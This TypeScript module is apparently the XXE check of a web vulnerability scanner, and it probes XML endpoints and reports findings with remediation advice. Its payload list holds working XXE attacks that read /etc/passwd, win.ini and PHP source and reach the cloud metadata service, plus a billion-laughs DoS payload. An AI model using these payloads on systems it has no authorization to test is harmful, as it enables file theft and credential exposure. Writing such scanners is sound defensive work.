import { http } from '../../utils/http'
import { Finding } from '@vuln-scanner/shared-types'

const CAT = 'injection'

// XXE payloads targeting common sensitive files
const XXE_PAYLOADS = [
  {
    label:   'Linux /etc/passwd read',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
    markers: ['root:x:', 'daemon:', 'nobody:'],
  },
  {
    label:   'Windows win.ini read',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>`,
    markers: ['[fonts]', '[extensions]', 'for 16-bit'],
  },
  {
    label:   'Internal SSRF via XXE',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>`,
    markers: ['ami-id', 'instance-id', 'local-ipv4'],
  },
  {
    label:   'Billion laughs (DoS test)',
    payload: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>`,
    markers: [],   // detect by timeout/500 response
    isDoS:   true,
  },
  {
    label:   'PHP filter base64 source read',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root><data>&xxe;</data></root>`,
    markers: ['PD9waHA', 'PHBocA'],   // base64 of "<?php"
  },
]

// Common XML-accepting endpoints and content types
const XML_CONTENT_TYPES = [
  'application/xml',
  'text/xml',
  'application/soap+xml',
  'application/rss+xml',
]

async function findXMLEndpoints(url: string): Promise<string[]> {
  const endpoints: string[] = [url]
  const base = new URL(url).origin

  // Common XML-accepting paths
  const xmlPaths = [
    '/api', '/api/v1', '/api/v2',
    '/xml', '/soap', '/wsdl',
    '/upload', '/import', '/parse',
    '/feed', '/rss', '/atom',
    '/sitemap.xml', '/api/data',
    '/service', '/ws',
  ]

  for (const path of xmlPaths) {
    endpoints.push(`${base}${path}`)
  }

  return endpoints
}

export async function xxeCheck(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  const reported = new Set<string>()

  const endpoints = await findXMLEndpoints(url)

  for (const endpoint of endpoints) {
    if (reported.has(endpoint)) continue

    for (const { label, payload, markers, isDoS } of XXE_PAYLOADS) {
      // Skip DoS payload unless it's the only one left
      if (isDoS) continue

      // Try each XML content type
      for (const contentType of XML_CONTENT_TYPES) {
        try {
          const start = Date.now()
          const res   = await http.post(endpoint, payload, {
            headers: {
              'Content-Type': contentType,
              'Accept':       'application/xml, text/xml, */*',
            },
            timeout: 10000,
          })
          const elapsed = Date.now() - start
          const body    = String(res.data)

          // Check for file content markers
          const hit = markers.find(m => body.includes(m))
          if (hit) {
            reported.add(endpoint)
            findings.push({
              category:    CAT,
              checkName:   'xxe-file-read',
              severity:    'CRITICAL',
              title:       `XXE injection — ${label}`,
              description: `The server processed an XML External Entity and returned sensitive file contents in the response. This enables attackers to read arbitrary files from the server, including credentials, source code, and configuration files.`,
              evidence: [
                `Endpoint: ${endpoint}`,
                `Content-Type: ${contentType}`,
                `Payload type: ${label}`,
                `Marker found: "${hit}"`,
                `Response snippet: ${body.slice(0, 400)}`,
              ].join('\n'),
              remediation: 'Disable external entity processing in your XML parser. In PHP: libxml_disable_entity_loader(true). In Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false). Use JSON instead of XML where possible.',
            })
            break
          }

          // Check for XML processing errors that reveal the parser
          const xmlErrors = [
            'xml parsing', 'xmlparseexception', 'sax parse',
            'document is not valid', 'xml syntax error',
            'expat library', 'libxml',
          ]
          const errorHit = xmlErrors.find(e => body.toLowerCase().includes(e))
          if (errorHit && res.status >= 400) {
            findings.push({
              category:    CAT,
              checkName:   'xxe-parser-exposed',
              severity:    'MEDIUM',
              title:       `XML parser error exposed — possible XXE vector`,
              description: `The endpoint returned an XML parser error, confirming it processes XML input. This endpoint should be tested manually for XXE — automated detection was inconclusive.`,
              evidence: [
                `Endpoint: ${endpoint}`,
                `Content-Type: ${contentType}`,
                `Error signature: "${errorHit}"`,
                `Status: ${res.status}`,
                `Response: ${body.slice(0, 300)}`,
              ].join('\n'),
              remediation: 'Disable external entity processing. Suppress verbose XML error messages in production. Consider switching to JSON APIs.',
            })
          }

          // Blind XXE — if response is suspiciously slow, entity may have been processed
          if (elapsed > 5000 && markers.length > 0) {
            findings.push({
              category:    CAT,
              checkName:   'xxe-blind-timing',
              severity:    'HIGH',
              title:       `Possible blind XXE — slow response on XML input`,
              description: `The endpoint took ${(elapsed / 1000).toFixed(1)}s to respond to an XXE payload. This may indicate the server attempted to resolve the external entity (e.g. making an outbound request) before responding.`,
              evidence: [
                `Endpoint: ${endpoint}`,
                `Payload: ${label}`,
                `Response time: ${elapsed}ms`,
              ].join('\n'),
              remediation: 'Disable external entity processing in your XML parser. Blind XXE can be used for SSRF and out-of-band data exfiltration.',
            })
          }

        } catch { /* skip */ }
      }

      if (reported.has(endpoint)) break
    }
  }

  return findings
}
